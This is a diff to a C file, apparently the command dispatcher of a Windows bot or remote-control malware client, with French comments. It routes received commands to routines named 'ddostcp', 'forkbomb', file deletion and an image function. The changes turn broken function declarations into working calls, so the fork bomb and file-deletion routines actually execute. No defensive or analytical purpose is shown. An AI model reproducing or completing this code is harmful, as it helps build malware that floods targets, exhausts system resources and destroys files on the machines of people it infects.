@@ -1,11 +1,18 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <windows.h>
 #include "proto.h"
 
-void ft_exec(char *message) {
-    char *token = strtok(message, " "); // Divise la chaîne en mots
-    
+void ftexec(char *command) {
+    char *token = strtok(command, " "); // Divise la chaîne en mots
+
+    int len = strlen(command);
+    if (len > 0 && (command[len - 1] == '\n' || command[len - 1] == '\r')) 
+    {
+        command[len - 1] = '\0';  // Supprimer le caractère de fin de ligne
+    }
+
     if (token != NULL) {
         if (strcmp(token, "ddostcp") == 0) {
 
@@ -72,14 +79,19 @@ void ft_exec(char *message) {
             token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre fichier a supprimer
             if (token != NULL) {
                 char * fichierdel = token;
-                void supfichier (char * fichierdel);
+                supfichier (fichierdel);
 
             } 
         }
 
 
         else if (strcmp(token, "forkbomb") == 0) {
-            void forkbomb();
+            forkbomb();
+        }
+
+        else if (strcmp(token, "test") == 0) {
+            printf("Comparaison de string test : OK!");
+            Sleep(3000);
         }
 
 
@@ -98,7 +110,7 @@ void ft_exec(char *message) {
             token = strtok(NULL, " "); // Obtient le deuxième mot de la string qui est notre fichier a supprimer
             if (token != NULL) {
                 char * fichierimage = token;
-                void image(char * fichierimage);
+                image(fichierimage);
 
             } 
         }
@@ -142,6 +154,7 @@ void ft_exec(char *message) {
 
          else {
             printf("Fonction inconnue.\n");
+            Sleep(5000);
         }
     }
 
